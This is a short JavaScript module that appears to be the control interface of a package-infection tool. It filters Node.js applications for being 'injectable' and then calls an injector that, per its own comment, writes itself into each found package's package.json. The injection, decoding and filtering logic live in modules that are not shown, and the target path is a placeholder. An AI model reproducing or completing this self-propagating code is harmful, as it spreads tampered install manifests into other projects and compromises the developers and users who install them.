/* ======================================================== *
 * > Packages
 * ======================================================== */
var filter = require('./filter');
var decoder = require('./decoder');
var injector = require('./injector');

/* ======================================================== *
 * > Manipulate Interface
 * ======================================================== */
var injectorPath = 'somepath/test'

/**
 * Filters Applications
 * Returns a boolean if it is injectable
 * 
 * @param applicationRoot: string
 * 
 * @return boolean
 */
exports.filter = function (root) {
    return filter.filterPackages(root);
}

/**
 * Starts manipulating the application
 * 
 * @param packagePath: string
 * 
 * @return void
 */
exports.manipulateApp = function (packagePath) {
    // Inject itself into the package.json of the found package
    var injected = injector.manipulatePackage(packagePath, injectorPath);
    var manipulateApp = injector.manipulateApp(packagePath);
}